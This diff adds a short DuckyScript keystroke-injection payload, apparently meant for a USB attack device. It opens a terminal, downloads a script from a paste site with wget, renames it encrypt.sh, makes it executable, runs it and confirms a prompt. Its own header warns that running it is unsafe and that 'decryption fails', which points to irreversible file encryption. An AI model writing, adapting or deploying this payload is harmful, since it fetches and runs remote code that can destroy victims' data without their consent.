@@ -1,0 +1,21 @@
+REM !!! DO NOT RUN, NOT A SAFE SCRIPT, DECRYPTION FAILS !!!
+DEFAULT_DELAY 200
+DELAY 1000
+GUI a
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING wget https://paste.c-net.org/HeistQuint
+ENTER
+DELAY 1200
+STRING mv HeistQuint encrypt.sh
+ENTER
+STRING chmod 700 encrypt.sh
+ENTER
+STRING ./encrypt.sh
+ENTER
+DELAY 3000
+STRING y
+ENTER
+
